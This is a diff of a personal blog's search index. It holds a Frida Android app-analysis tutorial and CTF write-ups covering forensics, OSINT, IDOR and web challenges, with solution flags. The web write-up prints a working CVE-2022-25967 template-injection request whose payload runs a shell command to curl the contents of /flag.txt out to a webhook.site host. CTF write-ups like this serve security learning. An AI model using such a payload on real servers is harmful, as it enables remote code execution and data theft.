@@ -1,6 +1,247 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>APK Analysis Frida</title>
+    <url>/2025/06/04/APK-Analysis-Frida/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\node_modules\aplayer\dist\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\node_modules\aplayer\dist\Meting.min.js"></script><p>What is Frida?<br>Frida is a toolkit that enables dynamic interaction with running programs.</p>
+<h2 id="Installing-Frida"><a href="#Installing-Frida" class="headerlink" title="Installing Frida"></a>Installing Frida</h2><div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">pip install frida-tools</span><br></pre></td></tr></table></figure></div>
+<p>Then test the installation:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">frida --version</span><br></pre></td></tr></table></figure></div>
+<p>Next, match your device’s architecture (use adb shell getprop ro.product.cpu.abi)</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">adb shell getprop ro.product.cpu.abi</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="Using-Frida-for-APK-Analysis"><a href="#Using-Frida-for-APK-Analysis" class="headerlink" title="Using Frida for APK Analysis"></a>Using Frida for APK Analysis</h2><ol>
+<li><strong>Connect your Android device</strong> via USB and ensure USB debugging is enabled.</li>
+<li><strong>Start the Frida server</strong> on your Android device: <div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">adb shell</span><br><span class="line">su</span><br><span class="line">frida-server &amp;</span><br></pre></td></tr></table></figure></div></li>
+<li><strong>List running processes</strong> to find your target app: <div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">frida-ps -U</span><br></pre></td></tr></table></figure></div></li>
+<li><strong>Attach to the target app</strong> using its process ID or name: <div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">frida -U -n &lt;app_name&gt;</span><br></pre></td></tr></table></figure></div></li>
+<li><strong>Inject scripts</strong> to manipulate or analyze the app: <div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">frida -U -l your_script.js -n &lt;app_name&gt;</span><br></pre></td></tr></table></figure></div></li>
+<li><strong>Use Frida’s REPL</strong> to interactively explore the app: <div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">    frida -U -n &lt;app_name&gt; -f &lt;app_name&gt; --no</span><br><span class="line">-pause</span><br></pre></td></tr></table></figure></div></li>
+<li><strong>Write custom scripts</strong> to hook functions, modify behavior, or extract data: <div class="code-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="title class_">MainActivity</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;com.example.app.MainActivity&#x27;</span>);</span><br><span class="line">    <span class="title class_">MainActivity</span>.<span class="property">someMethod</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;someMethod called&#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">someMethod</span>();</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></div></li>
+</ol>
+]]></content>
+      <tags>
+        <tag>APK</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>CSLU 2024 UPM</title>
+    <url>/2024/12/31/CSLU-2024-UPM/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\node_modules\aplayer\dist\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\node_modules\aplayer\dist\Meting.min.js"></script><h1 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h1><h2 id="Dr-Mals"><a href="#Dr-Mals" class="headerlink" title="Dr. Mals"></a>Dr. Mals</h2><hr>
+<ol>
+<li>Download the Dr. Mals word file</li>
+<li>Use Oletools - olevba to decrypt this file<ul>
+<li><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://github.com/user-attachments/assets/f6c2bc3c-cc2f-40dc-a40b-8eaef09150cd"
+                      alt="image"
+                ></li>
+</ul>
+</li>
+<li>With the use of CyberChef, we can find out the encoded text<ul>
+<li><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://github.com/user-attachments/assets/927f7112-1acd-487a-8c57-a5a9fa5fa144"
+                      alt="image"
+                ></li>
+</ul>
+</li>
+<li>Searching the website and it given<ul>
+<li><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://github.com/user-attachments/assets/3f0cf691-eea1-45ce-9dd9-30e9442d1a79"
+                      alt="image"
+                ></li>
+</ul>
+</li>
+<li>Lets decode this<ul>
+<li>With the use of online decoderwe can find out the flag</li>
+<li><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://github.com/user-attachments/assets/62c1dd32-c3a9-4a8d-9f3b-3b331119dba8"
+                      alt="image"
+                ></li>
+</ul>
+</li>
+<li>Thats it.</li>
+</ol>
+<h4 id="Acknowledgement"><a href="#Acknowledgement" class="headerlink" title="Acknowledgement"></a>Acknowledgement</h4><p>Thx to Akram for providing Hint</p>
+<h2 id="RE-Memory-Delete"><a href="#RE-Memory-Delete" class="headerlink" title="RE:Memory Delete"></a>RE:Memory Delete</h2><hr>
+<ol>
+<li>First, we download the attached file given by the challenge.<ul>
+<li>Challenge.7z</li>
+</ul>
+</li>
+<li>Unzip it.<br>-Challenge.ad1 files inside.</li>
+<li>.ad1 is a image files so lets use FTK Imager to find the deleted file</li>
+<li><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://github.com/user-attachments/assets/98a6ce23-53b1-4a37-9a8c-9a9cae49e6f1"
+                      alt="image"
+                ></li>
+<li>There goes the flag</li>
+</ol>
+<h2 id="Skyfall"><a href="#Skyfall" class="headerlink" title="Skyfall"></a>Skyfall</h2><hr>
+<p><em>Pain killer, My Skill issue… XD</em></p>
+<ol>
+<li>Download the file attach by the challenge.<br>-capture.pcapng</li>
+<li>Use wireshark to open the pcapng files</li>
+<li>See the clue given, Love the EDITED LEWIS VERSION files and lost the flag.<ul>
+<li><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://github.com/user-attachments/assets/9ec25fe0-ecd3-4587-a4e7-5887377fbfbe"
+                      alt="image"
+                ></li>
+</ul>
+</li>
+<li>File -&gt; Export -&gt; Http, and save all the files.</li>
+<li>we can see there is 5 files exported, 2 text file with word <code>File received successfully!</code> and <code>file_data=16ae9187d13259788a97aef16a7d50f8b6376fbcba92a0f53e7e68d9f562a3a6576a3183a8dc8631c64fbd9147c8b608</code><ul>
+<li>usefull for later</li>
+</ul>
+</li>
+<li>And there is a file with big data 24,345kb and let us see what file is that.</li>
+</ol>
+<ul>
+<li><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://github.com/user-attachments/assets/395b8f53-8888-4af0-bf28-ae6f5b156992"
+                      alt="image"
+                ></li>
+</ul>
+<ol start="7">
+<li>Looks like it is a elf file<br>  <img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://github.com/user-attachments/assets/a9223eb5-5494-4476-b76e-94ca61886bab"
+                      alt="image"
+                ></li>
+<li>I manage to find a website to extract the elf file <a class="link"   href="https://www.ezyzip.com/open-extract-elf-file.html#" >EzyZIP<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
+<li>We can see the largest file is here after extract</li>
+</ol>
+<ul>
+<li><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://github.com/user-attachments/assets/d61f4dc0-bd2e-4e85-922c-cbaaa903fb5e"
+                      alt="image"
+                ><br>After have a long time searching, i cant found any ways to extract pydata… skill issue XD</li>
+</ul>
+<ol start="10">
+<li>After the end of the day, my friend told me there is something call <code>Pyinstxtractor</code> that can extract it.<ul>
+<li><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://github.com/user-attachments/assets/647ba1e4-5257-4eae-8e27-94885a3b018b"
+                      alt="image"
+                ></li>
+<li>This is what i found</li>
+</ul>
+</li>
+<li>okayyyy here is it<ul>
+<li><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://github.com/user-attachments/assets/839516f6-2d26-4c28-af8e-cfbd172314e6"
+                      alt="image"
+                ></li>
+</ul>
+</li>
+<li>Theres alot files inside, but the one the name <code>skyfall-lewis-edited-version.pyc</code> is the most suspicious.<ul>
+<li><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://github.com/user-attachments/assets/b3e6721f-12fd-4eba-a1fc-7d8d92ac3bc0"
+                      alt="image"
+                ></li>
+</ul>
+</li>
+<li>With the use of this website <a class="link"   href="https://pylingual.io/" >Pylingual<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>, i transfer pyc files to py<ul>
+<li><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://github.com/user-attachments/assets/575f7882-fe26-4d1c-91f5-69de17c6099c"
+                      alt="image"
+                ></li>
+</ul>
+</li>
+<li>We can see it is a AES encyption function and the key is the time which the user encrypt when downloaded, so lets go back to wireshark and find the date when she successfuly download.<ul>
+<li><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://github.com/user-attachments/assets/f286e913-9441-4f6b-8273-1b7df152b17d"
+                      alt="image"
+                ></li>
+<li>We can find out that the epoch for the time she download the file is <code>1733988750</code></li>
+</ul>
+</li>
+<li>Then use GPT xd find the key out<ul>
+<li><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://github.com/user-attachments/assets/c5d87093-080a-410e-b361-ce07d7c64747"
+                      alt="image"
+                ></li>
+<li>ps: I also dk why need to use <code>1733988749</code> just told by my friend to use it cant find any things that support this epoch XD.</li>
+</ul>
+</li>
+<li>Okay, then let us go to decrypt it. Use cyberchef</li>
+<li><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://github.com/user-attachments/assets/0a6837ae-ddf5-41d3-a810-7318c56a4607"
+                      alt="image"
+                ><br>Heres the flag.<br>Okay its maybe abit harder than i though. cry die.</li>
+</ol>
+<h4 id="Acknowledgement-1"><a href="#Acknowledgement-1" class="headerlink" title="Acknowledgement"></a>Acknowledgement</h4><p>Thx to Bakayang for providing solution at the end of the day</p>
+<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="Useless-Website"><a href="#Useless-Website" class="headerlink" title="Useless Website"></a>Useless Website</h2><hr>
+<ol>
+<li><p>Download the source code of the website</p>
+</li>
+<li><p>We can see theres something in the package.json file</p>
+<ul>
+<li><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://github.com/user-attachments/assets/ded38f60-d45c-406f-87ca-353241b395e5"
+                      alt="image"
+                ></li>
+</ul>
+</li>
+<li><p>Searching on the internet <code>CVE-2022-25967</code> showing that there is some leakage can be use on the eta framework.</p>
+</li>
+<li><p>In burpsuite, intercept the web and change to this</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><figcaption><span>/utils/settings HTTP/1.1</span></figcaption><table><tr><td class="code"><pre><span class="line">Host: 5.75.155.50:1341</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">If-None-Match: W/&quot;1057-ih1IUXlwncna8aHynJLYIHjiX30&quot;</span><br><span class="line">Priority: u=0, i</span><br><span class="line">Content-Length: 292</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;settings&quot;: &#123;</span><br><span class="line">    &quot;view options&quot;: &#123;</span><br><span class="line">      &quot;varName&quot;: &quot;x=process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;curl https://webhook.site/self id/$(cat /flag.txt)&#x27;)&quot;,</span><br><span class="line">      &quot;include&quot;: false,</span><br><span class="line">      &quot;includeFile&quot;: false,</span><br><span class="line">      &quot;useWith&quot;: true</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+</li>
+<li><p>And we can find out the flag at the end of the webhook link.</p>
+<ul>
+<li><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://github.com/user-attachments/assets/ee3ce174-09de-43c1-82ea-43f979aa075d"
+                      alt="image"
+                ></li>
+<li><code>CSLU&#123;wh4ts_y0ur_et4?&#125;</code></li>
+</ul>
+</li>
+</ol>
+<h4 id="Acknowledgement-2"><a href="#Acknowledgement-2" class="headerlink" title="Acknowledgement"></a>Acknowledgement</h4><p>Thx for Megat for the solution.</p>
+]]></content>
+      <categories>
+        <category>CTF 2024</category>
+      </categories>
+      <tags>
+        <tag>Forensics</tag>
+        <tag>Web</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Arm-Malaysia On Demand Training</title>
     <url>/2025/07/28/Arm-Malaysia-On-Demand-Traning/</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\node_modules\aplayer\dist\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\node_modules\aplayer\dist\Meting.min.js"></script><h1 id="Arm-Malaysia-On-Demand-Training"><a href="#Arm-Malaysia-On-Demand-Training" class="headerlink" title="Arm-Malaysia On Demand Training"></a>Arm-Malaysia On Demand Training</h1><h2 id="Day-1"><a href="#Day-1" class="headerlink" title="Day 1"></a>Day 1</h2><h3 id="Introduction-to-ARM"><a href="#Introduction-to-ARM" class="headerlink" title="Introduction to ARM"></a>Introduction to ARM</h3><p>ARM stands for Advanced RISC Machine, a family of computer processors that are widely used in mobile devices, embedded systems, and increasingly in servers and desktops. ARM processors are known for their power efficiency and performance. Almost 100% of smartphones and tablets use ARM processors, making them a dominant force in the mobile computing market.</p>
@@ -314,400 +555,6 @@
       <tags>
         <tag>ARM</tag>
         <tag>IC Design</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>CSLU 2024 UPM</title>
-    <url>/2024/12/31/CSLU-2024-UPM/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\node_modules\aplayer\dist\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\node_modules\aplayer\dist\Meting.min.js"></script><h1 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h1><h2 id="Dr-Mals"><a href="#Dr-Mals" class="headerlink" title="Dr. Mals"></a>Dr. Mals</h2><hr>
-<ol>
-<li>Download the Dr. Mals word file</li>
-<li>Use Oletools - olevba to decrypt this file<ul>
-<li><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://github.com/user-attachments/assets/f6c2bc3c-cc2f-40dc-a40b-8eaef09150cd"
-                      alt="image"
-                ></li>
-</ul>
-</li>
-<li>With the use of CyberChef, we can find out the encoded text<ul>
-<li><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://github.com/user-attachments/assets/927f7112-1acd-487a-8c57-a5a9fa5fa144"
-                      alt="image"
-                ></li>
-</ul>
-</li>
-<li>Searching the website and it given<ul>
-<li><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://github.com/user-attachments/assets/3f0cf691-eea1-45ce-9dd9-30e9442d1a79"
-                      alt="image"
-                ></li>
-</ul>
-</li>
-<li>Lets decode this<ul>
-<li>With the use of online decoderwe can find out the flag</li>
-<li><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://github.com/user-attachments/assets/62c1dd32-c3a9-4a8d-9f3b-3b331119dba8"
-                      alt="image"
-                ></li>
-</ul>
-</li>
-<li>Thats it.</li>
-</ol>
-<h4 id="Acknowledgement"><a href="#Acknowledgement" class="headerlink" title="Acknowledgement"></a>Acknowledgement</h4><p>Thx to Akram for providing Hint</p>
-<h2 id="RE-Memory-Delete"><a href="#RE-Memory-Delete" class="headerlink" title="RE:Memory Delete"></a>RE:Memory Delete</h2><hr>
-<ol>
-<li>First, we download the attached file given by the challenge.<ul>
-<li>Challenge.7z</li>
-</ul>
-</li>
-<li>Unzip it.<br>-Challenge.ad1 files inside.</li>
-<li>.ad1 is a image files so lets use FTK Imager to find the deleted file</li>
-<li><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://github.com/user-attachments/assets/98a6ce23-53b1-4a37-9a8c-9a9cae49e6f1"
-                      alt="image"
-                ></li>
-<li>There goes the flag</li>
-</ol>
-<h2 id="Skyfall"><a href="#Skyfall" class="headerlink" title="Skyfall"></a>Skyfall</h2><hr>
-<p><em>Pain killer, My Skill issue… XD</em></p>
-<ol>
-<li>Download the file attach by the challenge.<br>-capture.pcapng</li>
-<li>Use wireshark to open the pcapng files</li>
-<li>See the clue given, Love the EDITED LEWIS VERSION files and lost the flag.<ul>
-<li><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://github.com/user-attachments/assets/9ec25fe0-ecd3-4587-a4e7-5887377fbfbe"
-                      alt="image"
-                ></li>
-</ul>
-</li>
-<li>File -&gt; Export -&gt; Http, and save all the files.</li>
-<li>we can see there is 5 files exported, 2 text file with word <code>File received successfully!</code> and <code>file_data=16ae9187d13259788a97aef16a7d50f8b6376fbcba92a0f53e7e68d9f562a3a6576a3183a8dc8631c64fbd9147c8b608</code><ul>
-<li>usefull for later</li>
-</ul>
-</li>
-<li>And there is a file with big data 24,345kb and let us see what file is that.</li>
-</ol>
-<ul>
-<li><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://github.com/user-attachments/assets/395b8f53-8888-4af0-bf28-ae6f5b156992"
-                      alt="image"
-                ></li>
-</ul>
-<ol start="7">
-<li>Looks like it is a elf file<br>  <img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://github.com/user-attachments/assets/a9223eb5-5494-4476-b76e-94ca61886bab"
-                      alt="image"
-                ></li>
-<li>I manage to find a website to extract the elf file <a class="link"   href="https://www.ezyzip.com/open-extract-elf-file.html#" >EzyZIP<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
-<li>We can see the largest file is here after extract</li>
-</ol>
-<ul>
-<li><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://github.com/user-attachments/assets/d61f4dc0-bd2e-4e85-922c-cbaaa903fb5e"
-                      alt="image"
-                ><br>After have a long time searching, i cant found any ways to extract pydata… skill issue XD</li>
-</ul>
-<ol start="10">
-<li>After the end of the day, my friend told me there is something call <code>Pyinstxtractor</code> that can extract it.<ul>
-<li><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://github.com/user-attachments/assets/647ba1e4-5257-4eae-8e27-94885a3b018b"
-                      alt="image"
-                ></li>
-<li>This is what i found</li>
-</ul>
-</li>
-<li>okayyyy here is it<ul>
-<li><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://github.com/user-attachments/assets/839516f6-2d26-4c28-af8e-cfbd172314e6"
-                      alt="image"
-                ></li>
-</ul>
-</li>
-<li>Theres alot files inside, but the one the name <code>skyfall-lewis-edited-version.pyc</code> is the most suspicious.<ul>
-<li><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://github.com/user-attachments/assets/b3e6721f-12fd-4eba-a1fc-7d8d92ac3bc0"
-                      alt="image"
-                ></li>
-</ul>
-</li>
-<li>With the use of this website <a class="link"   href="https://pylingual.io/" >Pylingual<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>, i transfer pyc files to py<ul>
-<li><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://github.com/user-attachments/assets/575f7882-fe26-4d1c-91f5-69de17c6099c"
-                      alt="image"
-                ></li>
-</ul>
-</li>
-<li>We can see it is a AES encyption function and the key is the time which the user encrypt when downloaded, so lets go back to wireshark and find the date when she successfuly download.<ul>
-<li><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://github.com/user-attachments/assets/f286e913-9441-4f6b-8273-1b7df152b17d"
-                      alt="image"
-                ></li>
-<li>We can find out that the epoch for the time she download the file is <code>1733988750</code></li>
-</ul>
-</li>
-<li>Then use GPT xd find the key out<ul>
-<li><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://github.com/user-attachments/assets/c5d87093-080a-410e-b361-ce07d7c64747"
-                      alt="image"
-                ></li>
-<li>ps: I also dk why need to use <code>1733988749</code> just told by my friend to use it cant find any things that support this epoch XD.</li>
-</ul>
-</li>
-<li>Okay, then let us go to decrypt it. Use cyberchef</li>
-<li><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://github.com/user-attachments/assets/0a6837ae-ddf5-41d3-a810-7318c56a4607"
-                      alt="image"
-                ><br>Heres the flag.<br>Okay its maybe abit harder than i though. cry die.</li>
-</ol>
-<h4 id="Acknowledgement-1"><a href="#Acknowledgement-1" class="headerlink" title="Acknowledgement"></a>Acknowledgement</h4><p>Thx to Bakayang for providing solution at the end of the day</p>
-<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="Useless-Website"><a href="#Useless-Website" class="headerlink" title="Useless Website"></a>Useless Website</h2><hr>
-<ol>
-<li><p>Download the source code of the website</p>
-</li>
-<li><p>We can see theres something in the package.json file</p>
-<ul>
-<li><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://github.com/user-attachments/assets/ded38f60-d45c-406f-87ca-353241b395e5"
-                      alt="image"
-                ></li>
-</ul>
-</li>
-<li><p>Searching on the internet <code>CVE-2022-25967</code> showing that there is some leakage can be use on the eta framework.</p>
-</li>
-<li><p>In burpsuite, intercept the web and change to this</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><figcaption><span>/utils/settings HTTP/1.1</span></figcaption><table><tr><td class="code"><pre><span class="line">Host: 5.75.155.50:1341</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">If-None-Match: W/&quot;1057-ih1IUXlwncna8aHynJLYIHjiX30&quot;</span><br><span class="line">Priority: u=0, i</span><br><span class="line">Content-Length: 292</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;settings&quot;: &#123;</span><br><span class="line">    &quot;view options&quot;: &#123;</span><br><span class="line">      &quot;varName&quot;: &quot;x=process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;curl https://webhook.site/self id/$(cat /flag.txt)&#x27;)&quot;,</span><br><span class="line">      &quot;include&quot;: false,</span><br><span class="line">      &quot;includeFile&quot;: false,</span><br><span class="line">      &quot;useWith&quot;: true</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
-</li>
-<li><p>And we can find out the flag at the end of the webhook link.</p>
-<ul>
-<li><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://github.com/user-attachments/assets/ee3ce174-09de-43c1-82ea-43f979aa075d"
-                      alt="image"
-                ></li>
-<li><code>CSLU&#123;wh4ts_y0ur_et4?&#125;</code></li>
-</ul>
-</li>
-</ol>
-<h4 id="Acknowledgement-2"><a href="#Acknowledgement-2" class="headerlink" title="Acknowledgement"></a>Acknowledgement</h4><p>Thx for Megat for the solution.</p>
-]]></content>
-      <categories>
-        <category>CTF 2024</category>
-      </categories>
-      <tags>
-        <tag>Forensics</tag>
-        <tag>Web</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Readme</title>
-    <url>/2024/12/31/Readme/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\node_modules\aplayer\dist\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\node_modules\aplayer\dist\Meting.min.js"></script><p>This is my First Post in my Website!!<br>There will be Writeup for my CTF Challenge and maybe some Learning stuff I Guess???</p>
-]]></content>
-  </entry>
-  <entry>
-    <title>Try Hack Me Hackinfinity Battle CTF 2025</title>
-    <url>/2025/03/19/Try-Hack-Me-Hackinfinity-Battle-CTF-2025/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\node_modules\aplayer\dist\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\node_modules\aplayer\dist\Meting.min.js"></script><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="NotePad-Online"><a href="#NotePad-Online" class="headerlink" title="NotePad Online"></a>NotePad Online</h2><ol>
-<li>First, start the machine and sign in to the ip address and email+password given.</li>
-<li>Have a look in the url, we can see the url have id&#x3D;1.</li>
-<li>Lets have a try to increase the number and we can found that it do can be increase and changing different data shown.</li>
-<li>After arrive id&#x3D;7, it show that we can decrease the number 1 so change it to 0</li>
-<li>Tada! The flag is there <code>THM&#123;i_can_see_your_notes&#125;</code></li>
-</ol>
-<h1 id="Osint"><a href="#Osint" class="headerlink" title="Osint"></a>Osint</h1><h2 id="Catch-Me-If-You-Can"><a href="#Catch-Me-If-You-Can" class="headerlink" title="Catch Me If You Can"></a>Catch Me If You Can</h2><ol>
-<li>According to the Image given, It show a building with a some arts.</li>
-<li>after image search on google, we found that it is at brazil, beco do batman.</li>
-<li>Google search beco do batman burger restaurant shows some restaurant name but first is coringa do beco.</li>
-<li>Flag &#x3D; THM{coringa_do_beco}</li>
-</ol>
-]]></content>
-  </entry>
-  <entry>
-    <title>APK Analysis Frida</title>
-    <url>/2025/06/04/APK-Analysis-Frida/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\node_modules\aplayer\dist\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\node_modules\aplayer\dist\Meting.min.js"></script><p>What is Frida?<br>Frida is a toolkit that enables dynamic interaction with running programs.</p>
-<h2 id="Installing-Frida"><a href="#Installing-Frida" class="headerlink" title="Installing Frida"></a>Installing Frida</h2><div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">pip install frida-tools</span><br></pre></td></tr></table></figure></div>
-<p>Then test the installation:</p>
-<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">frida --version</span><br></pre></td></tr></table></figure></div>
-<p>Next, match your device’s architecture (use adb shell getprop ro.product.cpu.abi)</p>
-<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">adb shell getprop ro.product.cpu.abi</span><br></pre></td></tr></table></figure></div>
-
-<h2 id="Using-Frida-for-APK-Analysis"><a href="#Using-Frida-for-APK-Analysis" class="headerlink" title="Using Frida for APK Analysis"></a>Using Frida for APK Analysis</h2><ol>
-<li><strong>Connect your Android device</strong> via USB and ensure USB debugging is enabled.</li>
-<li><strong>Start the Frida server</strong> on your Android device: <div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">adb shell</span><br><span class="line">su</span><br><span class="line">frida-server &amp;</span><br></pre></td></tr></table></figure></div></li>
-<li><strong>List running processes</strong> to find your target app: <div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">frida-ps -U</span><br></pre></td></tr></table></figure></div></li>
-<li><strong>Attach to the target app</strong> using its process ID or name: <div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">frida -U -n &lt;app_name&gt;</span><br></pre></td></tr></table></figure></div></li>
-<li><strong>Inject scripts</strong> to manipulate or analyze the app: <div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">frida -U -l your_script.js -n &lt;app_name&gt;</span><br></pre></td></tr></table></figure></div></li>
-<li><strong>Use Frida’s REPL</strong> to interactively explore the app: <div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">    frida -U -n &lt;app_name&gt; -f &lt;app_name&gt; --no</span><br><span class="line">-pause</span><br></pre></td></tr></table></figure></div></li>
